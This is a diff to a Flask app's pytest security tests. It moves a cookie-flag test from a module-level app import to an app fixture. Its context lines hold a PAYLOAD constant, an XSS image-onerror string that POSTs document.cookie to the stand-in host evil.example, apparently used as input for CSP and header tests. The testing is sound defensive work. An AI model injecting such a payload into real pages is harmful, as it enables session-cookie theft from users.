@@ -9,7 +9,6 @@ import pytest
 from flask_login import login_user
 
 import config
-from server import app as flask_app
 from server.models import db, User
 
 PAYLOAD = '<img src=x onerror="fetch(\'https://evil.example\', {method: \'POST\', body: document.cookie})">'
@@ -45,10 +44,10 @@ def test_every_response_has_a_content_security_policy(client, path):
     assert response.headers['X-Content-Type-Options'] == 'nosniff'
 
 
-def test_session_and_remember_cookies_are_http_only_and_lax(seeded_db):
-    with flask_app.test_request_context('/'):
+def test_session_and_remember_cookies_are_http_only_and_lax(app, seeded_db):
+    with app.test_request_context('/'):
         login_user(db.session.get(User, 1), remember=True)
-        response = flask_app.process_response(flask.Response())
+        response = app.process_response(flask.Response())
     cookies = {header.split('=', 1)[0]: header for header in response.headers.getlist('Set-Cookie')}
     assert set(cookies) == {'session', 'remember_token'}
     for header in cookies.values():
